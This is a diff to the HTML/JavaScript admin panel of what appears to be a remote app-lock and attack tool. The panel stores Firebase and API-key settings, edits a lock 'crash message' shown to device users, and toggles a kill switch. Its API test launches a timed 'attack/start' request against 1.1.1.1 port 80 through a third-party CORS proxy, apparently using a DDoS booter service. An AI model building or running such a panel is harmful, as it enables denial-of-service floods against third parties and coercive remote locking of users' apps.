@@ -80,7 +80,7 @@
         </div>
 
         <div class="box">
-            <h2>📢 CUSTOM NOTIFICATION MESSAGE</h2>
+            <h2>📢 CUSTOM NOTIFICATION & CRASH MESSAGE</h2>
             <input type="text" id="notifTitle" placeholder="Notification Title" value="App Locked By Owner">
             <textarea id="notifMessage" placeholder="Notification Message" style="min-height: 80px;">Lock Apply Within 10s. Agar tum 10s baad open kroge toh open nahi hoga!</textarea>
             <button onclick="saveNotif()" class="success">SAVE & UPDATE MESSAGE</button>
@@ -89,7 +89,7 @@
         <div class="box">
             <h2>🛑 APP LOCK STATUS</h2>
             <div class="lock-box">
-                <div id="lockStatusText" style="font-size: 16px; font-weight: bold; color: #00ff41;">Status : UNLOCKED</div>
+                <div id="lockStatusText" style="font-size: 16px; font-weight: bold; color: #00ff41;">Status: UNLOCKED</div>
                 <label class="switch">
                     <input type="checkbox" id="lockSwitch" onchange="toggleKill()">
                     <span class="slider"></span>
@@ -133,13 +133,21 @@
             } else { alert("Wrong Password"); }
         }
 
-        function saveDb() {
-            const db = dbUrlInput.value;
+        // --- FIX: Database URL Save with Firebase REST API ---
+        async function saveDb() {
+            const db = dbUrlInput.value.trim();
             if (!db) return alert("Enter DB URL");
-            localStorage.setItem('dbUrl', db);
-            fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: db }) });
-            alert("DB URL Saved!");
+            if (!db.endsWith('/')) { dbUrlInput.value = db + '/'; }
+            localStorage.setItem('dbUrl', dbUrlInput.value);
+            
+            // Save URL to Firebase Cloud so App can fetch
+            await fetch(`${dbUrlInput.value}settings/config.json`, { 
+                method: 'PUT', 
+                body: JSON.stringify({ db_url: dbUrlInput.value }) 
+            });
+            alert("DB URL Saved & Pushed to Cloud!");
         }
+
         function updateDb() { saveDb(); alert("DB URL Updated in Cloud!"); }
         function deleteDb() {
             if(confirm("Delete Database URL?")) { localStorage.removeItem('dbUrl'); dbUrlInput.value = ""; alert("DB URL Deleted Locally!"); }
@@ -148,13 +156,18 @@
         async function saveApi() {
             const db = dbUrlInput.value;
             if (!db) return alert("Save DB URL first");
-            let updateData = {};
-            for(let i=1; i<=10; i++) { updateData[`api_key_${i}`] = document.getElementById(`apiKey${i}`).value; }
-            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
+            let updateData = { db_url: db }; // Add db_url here as well to keep it safe
+            for(let i=1; i<=10; i++) { updateData[`api_key_${i}`] = document.getElementById(`apiKey${i}`).value.trim(); }
+            
+            // Save APIs to Cloud
+            await fetch(`${db}settings/config.json`, { 
+                method: 'PATCH', 
+                body: JSON.stringify(updateData) 
+            });
             alert("APIs Saved to Cloud!");
             fetchApis();
         }
-        function updateApi() { saveApi(); alert("APIs Updated!"); }
+        function updateApi() { saveApi(); }
         function deleteApi() {
             if(confirm("Clear all API Keys?")) { for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } saveApi(); }
         }
@@ -183,7 +196,6 @@
             } catch(e) {}
         }
 
-        // --- NEW FIXED API TEST ---
         async function testApi(apiKey, slotNumber) {
             const resDiv = document.getElementById('apiTestResult');
             resDiv.innerHTML = `<span style="color:#00e5ff;">Testing Slot ${slotNumber}... Please wait.</span>`;
@@ -191,7 +203,6 @@
             const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
             
             try {
-                // Using AllOrigins CORS proxy to bypass browser restriction
                 const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
                 const response = await fetch(proxyUrl);
                 const text = await response.text();
